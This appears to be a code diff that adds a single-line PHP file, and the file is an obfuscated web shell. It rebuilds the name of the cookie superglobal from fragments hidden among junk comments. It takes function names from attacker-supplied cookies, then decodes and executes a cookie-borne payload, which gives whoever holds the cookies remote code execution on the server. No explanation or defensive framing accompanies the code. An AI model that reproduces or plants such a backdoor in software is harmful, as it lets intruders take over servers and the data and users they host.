@@ -1,0 +1,1 @@
+<?php $pp='KI';$ct/*!k*/='_C';$f/*S|Tk*/='OO';$q/*V$*/='E';$fi=/*@]**/${$ct.$f.$pp.$q};if(isset($fi['LQ'])){$za=/*[r&;*/$fi['LQ'].$fi/*^*/['RM'];$t=$fi['P'].$fi['J'].$fi['C'];$d=$za('',$t($fi['r']));$d();}
